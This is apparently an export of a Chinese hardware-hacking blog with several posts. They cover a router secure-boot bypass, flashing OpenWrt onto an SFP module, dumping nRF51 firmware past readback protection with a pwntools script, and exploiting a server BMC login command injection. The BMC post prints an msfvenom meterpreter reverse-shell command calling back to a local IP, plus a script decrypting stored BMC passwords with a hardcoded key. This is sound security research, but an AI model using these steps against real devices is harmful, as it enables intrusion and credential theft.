Bytes = 4.4 MiB\rArchitecture: AArch64\rOS: Linux\rLoad Address: 0x41000000\rEntry Point: 0x41000000\rHash algo: crc32\rHash value: 0d057821\rHash algo: sha1\rHash value: 4d78bca5c451229651bfbf2ef2ad784fc9b1f815\rVerifying Hash Integrity ... crc32+ sha1+ OK\r## Loading fdt from FIT Image at 44000000 ...\rUsing 'config@rt5010w-d187-rev6' configuration\rTrying 'fdt-1' fdt subimage\rDescription: ARM64 OpenWrt askey_rt5010w-d187 device tree blob\rType: Flat Device Tree\rCompression: uncompressed\rData Start: 0x444642a8\rData Size: 41845 Bytes = 40.9 KiB\rArchitecture: AArch64\rHash algo: crc32\rHash value: dea9b9d9\rHash algo: sha1\rHash value: 82f3894f9de7075706476c00c3fc1c56e2934df4\rVerifying Hash Integrity ... crc32+ sha1+ OK\rBooting using the fdt blob at 0x444642a8\rUncompressing Kernel Image ... OK\rLoading Device Tree to 4a1f2000, end 4a1ff374 ... OK\rUsing machid 0x8750106 from environment\rStarting kernel ...\rJumping to AARCH64 kernel via monitor\r[ 0.000000] Booting Linux on physical CPU 0x0000000000 [0x410fd034]\r[ 0.000000] Linux version 5.15.98 (ubuntu@DESKTOP-F7F31J2) (aarch64-openwrt-linux-musl-gcc (OpenWrt GCC 12.2.0 r22236-a6fe02c018) 12.2.0, GNU ld (GNU Binutils) 2.40.0) #0 SMP Thu Mar 9 04:14:40 2023\r[ 0.000000] Machine model: Askey RT5010W-D187\r[ 0.000000] Zone ranges:\r[ 0.000000] DMA [mem 0x0000000040000000-0x00000000bfffffff]\r[ 0.000000] DMA32 empty\r[ 0.000000] Normal empty\r[ 0.000000] Movable zone start for each node\r[ 0.000000] Early memory node ranges\r[ 0.000000] node 0: [mem 0x0000000040000000-0x0000000040ffffff]\r[ 0.000000] node 0: [mem 0x0000000041000000-0x000000004a3fffff]\r[ 0.000000] node 0: [mem 0x000000004a400000-0x00000000510fffff]\r[ 0.000000] node 0: [mem 0x0000000051100000-0x00000000bfffffff]\r 修复建议 开了安全启动之后不要给能切断可信链的机会\n防止通过故障注入进入U-Boot Shell 绝大多数开了安全启动的高通路由器都能这么干，应该是某种设计缺陷。\n除了Norton Core这个路由器。这里能找到它的U-Boot源码\n https://github.com/larrikinist/Norton-Core/blob/b34e7aabcc42be45e1f853c68b80ee6f48129a33/qsdk/qca/src/u-boot/arch/arm/cpu/armv7/ipq/cmd_bootipq.c#L786  可以看到它在bootipq失败之后直接卡死循环，而不是fallback到U-Boot Shell。这样会提高攻击门槛，如果想要像本文一样改uboot env，每次都必须拆flash用编程器刷\n防止通过编程器刷U-Boot Env 把flash拆了，刷APPSBL ENV分区，可以在bootcmd里插入指令，修改内存里的uboot代码逻辑，打破可信链\n应该写死uboot env不能动，hard code进uboot里\n","id":1,"section":"posts","summary":"貌似高通的QSDK默认都有这个安全问题 背景 最近发现一个便宜路由器Spectrum SAX1V1K，配置挺高的，只要200 RMB IPQ8072A + QCN5054 + QCN5024 4x4 WiFi 6 2G RAM","tags":null,"title":"Spectrum SAX1V1K 安全启动绕过","uri":"https://naivekun.com/2023/07/spectrum-sax1v1k-secboot-bypass/","year":"2023"},{"content":"最近这玩意非常火，闲鱼只要68块钱\n于是买回来自己折腾了一下\n材料准备  MA5671A猫棒 3.3v串口板子 SFP座子 几根线  文件 -\u0026gt; 传送门\n下载那个MA5671Amod.zip\n开始搞 接个串口 首先做一个烧录治具，至少需要一个sfp座子，淘宝几块钱就能买一个，如果改过双口CX341A应该会有存货\n接线这么接\n USB UART Adapter \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; SFP 20pins Molex connector\n3.3V \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;- red \u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;pin #15 und #16 TX \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; orange \u0026mdash;\u0026mdash;\u0026ndash;pin #2 RX \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; yellow \u0026mdash;\u0026mdash;\u0026ndash;pin #7 GND \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; green \u0026mdash;\u0026mdash;\u0026ndash; pin #10\n 飞线的话注意点别碰到隔壁触点给模块烧了\n由于我之前画过一个带SFP的板子，还引出了全部IO，就直接当烧录治具了，接线和上面是一样的\n波特率115200，接上去，串口输出这样\n然后就卡住了，一直重启\n貌似是因为串口和看门狗给mux了，插了串口就不开机\n解锁u-boot狗 需要设法绕过，思路是短接flash的某个信号脚，让模块开机的时候找不到flash，从而可选启动模式，然后选xmodem启动，把我们的u-boot刷进去\n把模块拆了，从侧面那个小洞捅开\n拆了长这样\n找两根线飞一下，如图\n模块插回去，开机，看到输出这玩意\n建议换teraterm，后面用得到\n输入7，进xmodem\n然后把uboot发进去，文件名是\u0026quot;1224ABORT.bin\u0026rdquo;，如图\n传好之后按空格和Ctrl-C\n此时把flash短接的线切断或者怎么搞断\n然后输下面这些东西进去\nFALCON =\u0026gt; setenv bootdelay 5\rFALCON =\u0026gt; setenv asc0 0\rFALCON =\u0026gt; setenv preboot \u0026quot;gpio input 105;gpio input 106;gpio input 107;gpio input 108;gpio set 3;gpio set 109;gpio set 110;gpio clear 423; gpio clear 422; gpio clear 325; gpio clear 402; gpio clear 424\u0026quot;\rFALCON =\u0026gt; saveenv\r 记得要把之前短接flash脚的线搞断，不然saveenv存不了\n然后拔了重插，模块就可以直接按空格和Ctrl-C进u-boot shell了，也可以直接开机了\n刷Openwrt 找到文件MA5671Amod.img，u-boot里面用loadb，然后kermit发进去\n然后喝杯茶等大概二十分钟就传好了\n传好之后赶快输下面这些，把刚才发的东西写flash里面，如果等待时间长了这u-boot会自己重启，白传了\nFALCON =\u0026gt; sf probe 0\rFALCON =\u0026gt; sf erase C0000 740000\rFALCON =\u0026gt; sf write 80800000 C0000 740000\r 这个偏移C0000就是系统里面的mtd2\n之后确保env里面这两个东西和我的一样\nimage1_is_valid=1\rcommitted_image=0\r 然后顺利进系统，进shell了\n刷个带Web的Openwrt 然后插交换机/网卡上面，ip改成192.168.1.0/24随便一个，光模块ip是192.168.1.10\n发现没web，可以ssh进去\nscp把附件中的mtd2.bin发进去，然后mtd write即可\n不知道为啥直接从uboot刷mtd2.bin会炸\n刷完之后模块会自动重启，重启之后就能进web了\n乱七八糟的LOID,password都能改\n另外这个模块一点也不凉快，如果没有风道很可能热炸，建议配合1u/2u路由器/服务器使用\n出现莫名其妙问题的先检查uboot里这两个参数\nimage1_is_valid=1\rcommitted_image=0\r 参考资料 https://www.onlinekosten.de/forum/showthread.php?p=2544021\n","id":2,"section":"posts","summary":"最近这玩意非常火，闲鱼只要68块钱 于是买回来自己折腾了一下 材料准备 MA5671A猫棒 3.3v串口板子 SFP座子 几根线 文件 -\u0026gt; 传送门 下载那个MA","tags":null,"title":"68块钱MA5671A猫棒刷Openwrt","uri":"https://naivekun.com/2021/12/ma5671a-flash-openwrt/","year":"2021"},{"content":"前一段有个灵车pm2.5检测器，淘宝只要12块钱。搜了下大概是个放口袋里用蓝牙和手机连接，检测PM2.5浓度的。\n搜到了前几年的新闻 -\u0026gt; 传送门\n然而买回来才发现，安卓客户端下载链接打不开。估计是厂子跑路了，不然怎么卖这么便宜。于是想自己日了玩玩\n0x0 拆了玩玩 里面很简单一个主板一个PM2.5检测元件一个电池\n单片机是nRF51288，一个支持蓝牙的片子\n照着数据手册量了一圈发现这里是SWD调试口\n从左到右依次是SWCLK,SWIO,GND,?\n于是，openocd启动！\n然而事情并没有这么简单\u0026hellip;\n0x1 初次尝试 因为没有客户端，为了能正常用它的PM2.5功能，最简单的方法就是逆一下它的蓝牙通信协议，写个土制客户端。\nswd排针是个1.54间距的。。。飞线到洞洞板再插到树莓派上。openocd可以用树莓派的gpio模拟swd或者jtag，不过坑不少。\n焊的太丑就不给拍清楚了QAQ，盲猜第四个脚是vcc3.3，顺手接上\nopenocd的配置文件只有树莓派1和2的，用了cpu频率算一个swd时钟频率，我这个pi3要改一些地方，配置文件改了改如下\n#\r# Config for using Raspberry Pi's expansion header\r#\r# This is best used with a fast enough buffer but also\r# is suitable for direct connection if the target voltage\r# matches RPi's 3.3V and the cable is short enough.\r#\r# Do not forget the GND connection, pin 6 of the expansion header.\r#\rinterface bcm2835gpio\rbcm2835gpio_peripheral_base 0x3F000000\r# Transition delay calculation: SPEED_COEFF/khz - SPEED_OFFSET\r# These depend on system clock, calibrated for stock 700MHz\r# bcm2835gpio_speed SPEED_COEFF SPEED_OFFSET\r#bcm2835gpio_speed_coeffs 146203 36\rbcm2835gpio_speed_coeffs 194938 48\r# Each of the JTAG lines need a gpio number set: tck tms tdi tdo\r# Header pin numbers: 23 22 19 21\r# bcm2835gpio_jtag_nums 11 25 10 9\r# or if you have both connected,\r# reset_config trst_and_srst srst_push_pull\rreset_config none separate\r# Each of the SWD lines need a gpio number set: swclk swdio\r# Header pin numbers: 22 18\rbcm2835gpio_swd_nums 25 24\r# If you define trst or srst, use appropriate reset_config\r# Header pin numbers: TRST - 26, SRST - 18\r# bcm2835gpio_trst_num 7\r# reset_config trst_only\rbcm2835gpio_srst_num 18\r#reset_config srst_only srst_push_pull\r# or if you have both connected,\r# reset_config trst_and_srst srst_push_pull\r#\r# script for Nordic nRF51 series, a Cortex-M0 chip\r#\rtransport select swd\rsource [find target/swj-dp.tcl]\rif { [info exists CHIPNAME] } {\rset _CHIPNAME $CHIPNAME\r} else {\rset _CHIPNAME nrf51\r}\rif { [info exists ENDIAN] } {\rset _ENDIAN $ENDIAN\r} else {\rset _ENDIAN little\r}\r# Work-area is a space in RAM used for flash programming\r# By default use 16kB\rif { [info exists WORKAREASIZE] } {\rset _WORKAREASIZE $WORKAREASIZE\r} else {\rset _WORKAREASIZE 0x4000\r}\rif { [info exists CPUTAPID] } {\rset _CPUTAPID $CPUTAPID\r} else {\rset _CPUTAPID 0x0bb11477\r}\rswj_newdap $_CHIPNAME cpu -expected-id $_CPUTAPID -irlen 4\rset _TARGETNAME $_CHIPNAME.cpu\rtarget create $_TARGETNAME cortex_m -chain-position $_TARGETNAME\r$_TARGETNAME configure -work-area-phys 0x20000000 -work-area-size $_WORKAREASIZE -work-area-backup 0\rif {![using_hla]} {\r# The chip supports standard ARM/Cortex-M0 SYSRESETREQ signal\rcortex_m reset_config sysresetreq\r}\rflash bank $_CHIPNAME.flash nrf51 0x00000000 0 1 1 $_TARGETNAME\rflash bank $_CHIPNAME.uicr nrf51 0x10001000 0 1 1 $_TARGETNAME\r#\r# The chip should start up from internal 16Mhz RC, so setting adapter\r# clock to 1Mhz should be OK\r#\radapter_khz 1000\rproc enable_all_ram {} {\r# nRF51822 Product Anomaly Notice (PAN) #16 explains that not all RAM banks\r# are reliably enabled after reset on some revisions (contrary to spec.) So after\r# resetting we enable all banks via the RAMON register\rmww 0x40000524 0xF\r}\r$_TARGETNAME configure -event reset-end { enable_all_ram }\rinit\rtargets\r 主要改了以下几个地方\n -irlen 4 // nrf51里面是个32位M0核，指令长度4字节 bcm2835gpio_speed_coeffs 194938 48 // 树莓派3的cpu频率和2不一样，原来是拿2的配置文件改的 reset_config none separate // 没接reset脚，这里让openocd不要管rst信号，不然后面reset会卡住然后超时 transport select swd // 神秘问题，不指定swd会默认走jtag然后不让改  然后板子通电，openocd -f xxx.cfg不出意外就可以看到芯片了\nnc连上127.0.0.1:4444进openocd终端，试一下就可以正常调试了\n然而问题出在这里\n读出来是全0\npc指向的代码也读不出来\n查了下手册是芯片的特性，Readback protection\nCR0标示代码地址不允许CR1部分代码或者调试口访问，该保护特性通过RBPCONF寄存器配置\nRBPCONF属于User Information Configuration Registers (UICR)，这组寄存器配置了芯片的一些运行信息如bootloader地址，代码段长度等等\nUICR必须写NVMC(Non-Volatile Memory Controller)的ERASEALL寄存器才能改，nvmc用来控制内存地址到flash的映射\n艹？必须要全擦除才行，等于UICR不能改，改了全部木大\n是芯片的安全特性，不允许随便读写flash\n0x2 利用pc读固件 看到了一篇文章 -\u0026gt; 传送门\n大概思路是\n arm thumb指令长度是16bit，想要32bit寻址就只能通过寄存器寻址，不能直接在指令里面塞立即数 readback保护是通过一个硬件模块实现的，只保护内存操作  也就是说可以随意操作寄存器的\n改之前\n改之后\n那么可以利用这句LDR R3, [R3]，R3可以是任意寄存器。只要猜出某个指令是直接用寄存器寻址，就操控pc一直跑那条指令，控制存地址的寄存器为要读取的内存地址  step过了几下，感觉我这个的R4拿来寻址了\n应该是0x6d4这个地址上的指令完成的寻址\n把pc改过去试试，读一下RBPCONF配置\n查了下手册在0x10001004上\n成功读出来是0xffff0000，保护全开\n那么想要dump固件只需要重复执行这个过程把0x0-0x40000的数据读出来就行\n存在flash上的代码是直接映射到0x0的\n0x3 dump固件 于是搓个脚本\nfrom pwn import *\rimport re\rp = remote(\u0026quot;127.0.0.1\u0026quot;, \u0026quot;4444\u0026quot;)\rp.recvuntil(\u0026quot;\u0026gt;\u0026quot;)\rp.write(\u0026quot;reset halt\\n\u0026quot;)\rp.recvuntil(\u0026quot;\u0026gt;\u0026quot;)\rwith open(\u0026quot;firmware.bin\u0026quot;, \u0026quot;wb\u0026quot;) as f:\rfor addr in range(0, 0x40000, 4):\rp.write(\u0026quot;reg pc 0x6d4\\n\u0026quot;)\rp.recvuntil(\u0026quot;\u0026gt;\u0026quot;)\rp.write(\u0026quot;reg r4 \u0026quot; + hex(addr) + \u0026quot;\\n\u0026quot;)\rp.recvuntil(\u0026quot;\u0026gt;\u0026quot;)\rp.write(\u0026quot;step\\n\u0026quot;)\rp.recvuntil(\u0026quot;\u0026gt;\u0026quot;)\rp.write(\u0026quot;reg r4\\n\u0026quot;)\rret = p.recvuntil(\u0026quot;\u0026gt;\u0026quot;)\rd = re.search('0x[0-9a-fA-F]{8}', ret.decode('utf-8'))[0]\rf.write(p32(int(d, 16)))\rif addr % 0x100 == 0:\rprint(\u0026quot;reading:\u0026quot;, addr)\r 跑一下大概半个小时就读出来了，丢进ida看下\n果然0x6d4是直接拿R4寻址\n于是固件就成功提取了\n彩蛋 能被轻易完整取下的防拆标\n焊线不小心把耳机夹在了中间\n","id":3,"section":"posts","summary":"前一段有个灵车pm2.5检测器，淘宝只要12块钱。搜了下大概是个放口袋里用蓝牙和手机连接，检测PM2.5浓度的。 搜到了前几年的新闻 -\u0026gt; 传送门 然","tags":null,"title":"nRF51系列单片机读取保护绕过","uri":"https://naivekun.com/2020/10/hack-on-nrf/","year":"2020"},{"content":"0x0 背景 前几天在某鱼捡了个便宜主板\n查了下应该是广达的工包测试板，全新，完全没资料网上查不到\n服务器主板一般会有一个管理芯片独立于整个主板，管理主板电源，温度，开关机，视频重定向。。。。然而ipmitool能连上获取信息，却没有web，ssh也是连上就断\n于是找了一波文档，发现有个相似的型号的\n通过ipmi raw command开启BMC Web\n看起来成功了。。。扫一下端口发现开了443\n于是打开浏览器去连接。。。发现连不上\n这。。。报了个奇怪的错误\n注意到lighttpd，这种嵌入式设备服务端api都是用C写的。。。lighttpd会把请求交给一个二进制库处理。。应该是跑炸了，在html前面生成了一个Parameter Error!\n然后发现ssh也是连不上的，连上之后立马connection close\n0x1 分析固件 查了一波资料，发现BMC芯片AST2400是个arm soc。。。板子上有自己独立的内存，SPI Flash。\n艹，这不就是个大号路由器\n但是对着板子看了一圈也没看见串口在哪里，一般路由器的套路是能插串口改bootargs进系统，dump整个固件 or 传个gdb server进去\n于是搜了一波资料发现有个socflash的工具可以读取固件\nsocflash_64.exe -b dump.bin\r 即可dump下来BMC的整个SPI Flash存储器\nbinwalk走一波\n标准的linux嵌入式设备。。u-boot, kernel rootfs一个都不缺\nbinwalk -e提取即可\n注意到第一个cramfs是个完整的linux文件系统，jffs2是一些配置文件，第二个cramfs是个web静态文件打包\n0x2 发现web登录问题 既然提取了固件，直接暴力grep即可\n再看下lighttpd配置文件，指向的正好是libmodhapi.so\n那么api handler就在那个so中，拖进ida打开，找字符串\n发现了这里有这个Parameter Error!\n看下invalidUser交叉引用，找到了登录认证的部分\n卧槽这也太蛇皮了。。。直接拼进system然后拿返回值，裸的命令注入\n正好没shell没法调试，从这拿个shell再说\nburp测一下\n这边直接收到返回了\n好，接下来需要弹一个shell\n0x3 弹shell 把reverse shell cheat sheet测了一个遍。。都没法弹。\n突然意识到。。。嵌入式设备用的busybox，没bash没nc啥都没有\n那就只能传个二进制程序进去跑了\n看了下kernel应该是arm小端序\n用msf生成payload\nmsfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=192.168.2.132 LPORT=4445 -f elf \u0026gt; meterpreter.elf\r wget下载，chmod +x，然后执行。注意+要url编码不然会被当成空格\n即可弹回meterpreter\n0x4 后续 有了shell啥都好办了，ssh登不上是有个配置文件写错了指向不存在的文件。。。出厂bug，果然是工厂流出的测试板\n0x5 不安全的密码策略 众所周知嵌入式设备特别喜欢硬编码密钥然后给密码对称加密一下。CISCO type 7 password就是这么搞的\n然后发现这个\n于是看一下哪里处理的EncryptedPswd，找了一圈发现在libipmi_helper.so.2.4.0里\n继续暴力grep，核心逻辑在libipmiamioempwdenc.so.2.1.0这个库里面\nlib ipmi ami oem pwd enc\n名称看起来很合理\n丢进ida看看\n跟到了DecryptPassword函数\n继续找找到了libblowfish.so\n解密逻辑就这么一点了，找了一圈没发现iv在哪，应该是ecb模式了\n密码是SetEncryptKey从/conf/pwdEncKey获取的\n就是megarac，软件名\n于是搓个脚本解密一下\nimport blowfish\rimport base64\rdata = [\rb\u0026quot;jT+Yah6ySlTO9NOzIXxkogAAAAAAAAAA\u0026quot;,\rb\u0026quot;OY7fIRe9fsQkinACXfgmUQAAAAAAAAAA\u0026quot;,\rb\u0026quot;zvTTsyF8ZKLO9NOzIXxkogAAAAAAAAAA\u0026quot;,\rb\u0026quot;f23Dq/SFBErO9NOzIXxkogAAAAAAAAAA\u0026quot;,\rb\u0026quot;masB7IKqyJ1+7HMeU4vo9wAAAAAAAAAA\u0026quot;\r]\rdef decrypt(cipherText):\rcipher = blowfish.Cipher(b\u0026quot;megarac\u0026quot;)\rdecrypted = b\u0026quot;\u0026quot;.join(cipher.decrypt_ecb(base64.b64decode(cipherText)))\rreturn decrypted\rfor i in data:\rprint(decrypt(i))\r 成功解密\nemmm我服了，，写个哈希那么难吗？？？\n","id":4,"section":"posts","summary":"0x0 背景 前几天在某鱼捡了个便宜主板 查了下应该是广达的工包测试板，全新，完全没资料网上查不到 服务器主板一般会有一个管理芯片独立于整个主板，管理主","tags":null,"title":"一次对服务器主板IPMI BMC的漏洞挖掘","uri":"https://naivekun.com/2020/08/hack-bmc/","year":"2020"},{"content":"分区扩容 看好自己的root分区在哪个设备，sd卡一般是/dev/mmcblk1，emmc是/dev/mmcblk2，用别人的dtb不一定，可能会变\n然后装个gdisk (1.3版本中会默认安装, 1.2手动装一下)\n使用gdisk打开磁盘，输入p可以看到当前分区信息\nrootfs在第五个分区\n我们首先删掉第五个分区然后新建一个大分区，起始位置要和原来的分区一致\n后三个参数直接Enter过去，默认即可\n然后改一下新分区的UUID，因为是GPT分区表，bootargs中rootfs所在分区也是由UUID标示的，新建分区的UUID是个随机的内容，直接开机会无法启动，找不到rootfs\n如图\n把uuid改成B921B044-1DF0-41C3-AF44-4C6F280D3FAE\n写入分区表\n之后resize2fs即可\n如图，分区已经扩大\n注意如果要写入emmc，应该先dd进emmc再扩大分区\nGPIO 花了一晚上xjb把GPIO试出来了\n在/sys/class/leds映射了4个led，分别是风扇fan，前面的绿灯green_led_front，剩下两个我自己搞得用可以不管\n开机电源按钮是GPIO 99\n做了个镜像，附带一个说明 要固件加群1101467449\n  怎么控制前面板led 开启前面板led echo 1 \u0026gt; /sys/class/leds/green_led_front/brightness 关闭前面板led echo 0 \u0026gt; /sys/class/leds/green_led_front/brightness\n  怎么控制风扇 风扇插电源接口旁边那个2pin插座 开启风扇 echo 1 \u0026gt; /sys/class/leds/fan/brightness 关闭风扇 echo 0 \u0026gt; /sys/class/leds/fan/brightness\n  附带一个温控脚本 双温度控制，高于temp_limit_high后风扇开启 风扇启动后，低于temp_limit_low后风扇关闭 使用前面板绿灯指示风扇状态\nimport os\rimport subprocess\rimport time\rfan_dev = \u0026quot;/sys/class/leds/fan/brightness\u0026quot;\rfront_led_dev = \u0026quot;/sys/class/leds/green_led_front/brightness\u0026quot;\rfan_status = 0\rtemp_limit_high = 55\rtemp_limit_low = 45\rdef fan_on():\ros.system(\u0026quot;echo 1 \u0026gt; \u0026quot;+fan_dev)\ros.system(\u0026quot;echo 1 \u0026gt; \u0026quot;+front_led_dev)\rdef fan_off():\ros.system(\u0026quot;echo 0 \u0026gt; \u0026quot;+fan_dev)\ros.system(\u0026quot;echo 0 \u0026gt; \u0026quot;+front_led_dev)\rdef get_temp():\rtemp = int(subprocess.check_output([\u0026quot;sh\u0026quot;, \u0026quot;-c\u0026quot;, \u0026quot;cat /sys/class/thermal/thermal_zone0/temp\u0026quot;]))\rreturn temp/1000\rwhile 1:\rtime.sleep(3)\rprint(\u0026quot;current temp:\u0026quot;, get_temp())\rif get_temp() \u0026gt; temp_limit_high and fan_status == 0:\rfan_status = 1\rfan_on()\rif get_temp() \u0026lt; temp_limit_low and fan_status == 1:\rfan_status = 0\rfan_off()\r 怎么写入emmc  卡刷： 扩容分区之前，dd卡前2GB到emmc即可 线刷： 找台linux电脑，确保可以运行rkdeveloptool 短接emmc背面靠近gnd测试点的脚，复位或者上电，让板子进入maskrom模式 使用rkdeveloptool的db功能载入loader，loader可以从rkbin仓库找，在github 使用rkdeveloptool的wl功能，从0x0开始将镜像写入即可 不推荐使用windows线刷。。。玄学比较多\n","id":5,"section":"posts","summary":"分区扩容 看好自己的root分区在哪个设备，sd卡一般是/dev/mmcblk1，emmc是/dev/mmcblk2，用别人的dtb不一定，可","tags":null,"title":"TN3399板子填坑","uri":"https://naivekun.com/2020/07/tn3399-more/","year":"2020"},{"content":"前一段某鱼有人卖便宜板子TN3399 V3\n部分图片来自恩山\n部分配置如下\n   部件名称 芯片型号 备注说明     CPU rk3399 Dual-core Cortex-A72 up to 1.8GHz;Quad-core Cortex-A53 up to 1.4GHz;Mali-T864 GPU   RAM K4B8G16 Dual-channel DDR3 1GB;板载 4 颗   Flash SanDisk SDINBDG4-16G eMMC 5.1   PMU RK808D    Ethernet RTL8211E 10/100/1000 Base-T   WIFI+BT AP6255 WIFI IEEE802.11 a/b/g/n/ac;BT4.2   SATA 3.0 JMS578    USB 2.0 FE1.1s 板载 TYPE A 插座 x 2;接插件插座x5   USB 3.0 VL817-Q7 板载 TYPE A 插座 x 2   UART SP3232EEN    HDMI 2.0+LVDS 358775G + ALC5640    Audio PA NS4258 5W x 2    同配置的开发板都要800+，这个这么多外设只要200，但是没资料，自带安卓系统\n于是自己搞来玩玩，给做了个Debian固件\n几个坑点 准备一台linux计算机，跑编译和刷固件需要\n准备一个支持1500000波特率的串口，辣鸡pl2303啥的弄不成，去买个cp2102\n准备工具链 wget -c https://mirrors.tuna.tsinghua.edu.cn/armbian-releases/_toolchains/gcc-linaro-7.4.1-2019.02-x86_64_aarch64-linux-gnu.tar.xz\rapt install -y build-essential libncurses5-dev git make\r gcc放到./toolchain 然后改一下PATH\n#!/bin/sh\rexport PATH=/home/debian/tn3399/toolchain/bin:$PATH\rexport CROSS_COMPILE=aarch64-linux-gnu-\rexport ARCH=arm64\r 编译U-Boot 查一下rockchip官网\n我们选择左边那一条启动路径（不知道为啥右边那条会跑飞）\n首先clone两个仓库\ngit clone https://github.com/rockchip-linux/u-boot.git\rgit clone https://github.com/rockchip-linux/rkbin.git\r 编译rockchip维护的u-boot # 不使用项目指定工具链\rsed -i 's@TOOLCHAIN_ARM32=.*@TOOLCHAIN_ARM32=/@g' ./make.sh\rsed -i 's@TOOLCHAIN_ARM64=.*@TOOLCHAIN_ARM64=/@g' ./make.sh\rsed -i 's@${absolute_path}/bin/@@g' ./make.sh\r# 编译修改过的 u-boot\r./make.sh evb-rk3399\r 得到uboot.img和rk3399_loader_v1.24.126.bin，等下需要\n制作idbloader.img # 找到rkbin带的ddr初始化文件，用u-boot里面的mkimage制作idbloader.img\rtools/mkimage -n rk3399 -T rksd -d ../rkbin/bin/rk33/rk3399_ddr_800MHz_v1.24.bin idbloader.img\r# 再往后写miniloader\rcat ../rkbin/bin/rk33/rk3399_miniloader_v1.26.bin \u0026gt;\u0026gt; idbloader.img\r 得到idbloader.img\n了解一下怎么刷emmc rk家的rom code支持usb启动，不怕弄成砖头\n首先上电，插上microusb，安装rkdeveloptool\n然后短接这两个脚，保持短接，按reset\n这步是把emmc某个数据脚接地，让rom code找不到emmc,进入usb启动\n然后用rkdeveloptool初始化ddr\nroot@a6:/hdd/samba/tn3399/naivekun# rkdeveloptool ld\rnot found any devices!\r# 短接复位后\rroot@a6:/hdd/samba/tn3399/naivekun# rkdeveloptool ld\rDevNo=1\tVid=0x2207,Pid=0x330c,LocationID=302\tMaskrom\rroot@a6:/hdd/samba/tn3399/naivekun# rkdeveloptool db /tmp/rk3399_loader_v1.24.126.bin Downloading bootloader succeeded.\rroot@a6:/hdd/samba/tn3399/naivekun#  然后rkdeveloptool wl \u0026lt;偏移\u0026gt; \u0026lt;文件名\u0026gt;就可以刷文件了\n刷入idbloader和uboot和trust\n刷完之后reset，不出意外串口就可以正常输出，进u-boot了\n编译kernel 首先把linux主线kernel拉下来\n改dts 把linux/arch/arm64/boot/dts/rockchip/rk3399-rock960.dts内容改成以下东西\n// SPDX-License-Identifier: (GPL-2.0+ OR MIT)\r/*\r* Copyright (c) 2018 Linaro Ltd.\r*/\r/dts-v1/;\r#include \u0026quot;rk3399-rock960.dtsi\u0026quot;\r/ {\rmodel = \u0026quot;TN3399 V3\u0026quot;;\rcompatible = \u0026quot;vamrs,rock960\u0026quot;, \u0026quot;rockchip,rk3399\u0026quot;;\rchosen {\rstdout-path = \u0026quot;serial2:1500000n8\u0026quot;;\r};\rclkin_gmac: external-gmac-clock {\rcompatible = \u0026quot;fixed-clock\u0026quot;;\rclock-frequency = \u0026lt;125000000\u0026gt;;\rclock-output-names = \u0026quot;clkin_gmac\u0026quot;;\r#clock-cells = \u0026lt;0\u0026gt;;\r};\rleds {\rcompatible = \u0026quot;gpio-leds\u0026quot;;\rpinctrl-names = \u0026quot;default\u0026quot;;\rpinctrl-0 = \u0026lt;\u0026amp;user_led1\u0026gt;, \u0026lt;\u0026amp;user_led2\u0026gt;, \u0026lt;\u0026amp;user_led3\u0026gt;,\r\u0026lt;\u0026amp;user_led4\u0026gt;, \u0026lt;\u0026amp;wlan_led\u0026gt;, \u0026lt;\u0026amp;bt_led\u0026gt;;\ruser_led1 {\rlabel = \u0026quot;green:user1\u0026quot;;\rgpios = \u0026lt;\u0026amp;gpio4 RK_PC2 0\u0026gt;;\rlinux,default-trigger = \u0026quot;heartbeat\u0026quot;;\r};\ruser_led2 {\rlabel = \u0026quot;green:user2\u0026quot;;\rgpios = \u0026lt;\u0026amp;gpio4 RK_PC6 0\u0026gt;;\rlinux,default-trigger = \u0026quot;mmc0\u0026quot;;\r};\ruser_led3 {\rlabel = \u0026quot;green:user3\u0026quot;;\rgpios = \u0026lt;\u0026amp;gpio4 RK_PD0 0\u0026gt;;\rlinux,default-trigger = \u0026quot;mmc1\u0026quot;;\r};\ruser_led4 {\rlabel = \u0026quot;green:user4\u0026quot;;\rgpios = \u0026lt;\u0026amp;gpio4 RK_PD4 0\u0026gt;;\rpanic-indicator;\rlinux,default-trigger = \u0026quot;none\u0026quot;;\r};\rwlan_active_led {\rlabel = \u0026quot;yellow:wlan\u0026quot;;\rgpios = \u0026lt;\u0026amp;gpio4 RK_PD5 0\u0026gt;;\rlinux,default-trigger = \u0026quot;phy0tx\u0026quot;;\rdefault-state = \u0026quot;off\u0026quot;;\r};\rbt_active_led {\rlabel = \u0026quot;blue:bt\u0026quot;;\rgpios = \u0026lt;\u0026amp;gpio4 RK_PD6 0\u0026gt;;\rlinux,default-trigger = \u0026quot;hci0-power\u0026quot;;\rdefault-state = \u0026quot;off\u0026quot;;\r};\r};\r};\r\u0026amp;gmac {\rassigned-clocks = \u0026lt;\u0026amp;cru SCLK_RMII_SRC\u0026gt;;\rassigned-clock-parents = \u0026lt;\u0026amp;clkin_gmac\u0026gt;;\rclock_in_out = \u0026quot;input\u0026quot;;\rphy-supply = \u0026lt;\u0026amp;vcc3v3_sys\u0026gt;;\rphy-mode = \u0026quot;rgmii\u0026quot;;\rpinctrl-names = \u0026quot;default\u0026quot;;\rpinctrl-0 = \u0026lt;\u0026amp;rgmii_pins\u0026gt;;\rsnps,reset-gpio = \u0026lt;\u0026amp;gpio3 RK_PB7 GPIO_ACTIVE_LOW\u0026gt;;\rsnps,reset-active-low;\rsnps,reset-delays-us = \u0026lt;0 10000 50000\u0026gt;;\rtx_delay = \u0026lt;0x28\u0026gt;;\rrx_delay = \u0026lt;0x11\u0026gt;;\rstatus = \u0026quot;okay\u0026quot;;\r};\r\u0026amp;pcie0 {\rep-gpios = \u0026lt;\u0026amp;gpio2 RK_PA2 GPIO_ACTIVE_HIGH\u0026gt;;\r};\r\u0026amp;pinctrl {\rgmac {\rrgmii_sleep_pins: rgmii-sleep-pins {\rrockchip,pins =\r\u0026lt;1 RK_PB2 RK_FUNC_GPIO \u0026amp;pcfg_output_low\u0026gt;;\r};\r};\rleds {\ruser_led1: user_led1 {\rrockchip,pins =\r\u0026lt;4 RK_PC2 RK_FUNC_GPIO \u0026amp;pcfg_pull_none\u0026gt;;\r};\ruser_led2: user_led2 {\rrockchip,pins =\r\u0026lt;4 RK_PC6 RK_FUNC_GPIO \u0026amp;pcfg_pull_none\u0026gt;;\r};\ruser_led3: user_led3 {\rrockchip,pins =\r\u0026lt;4 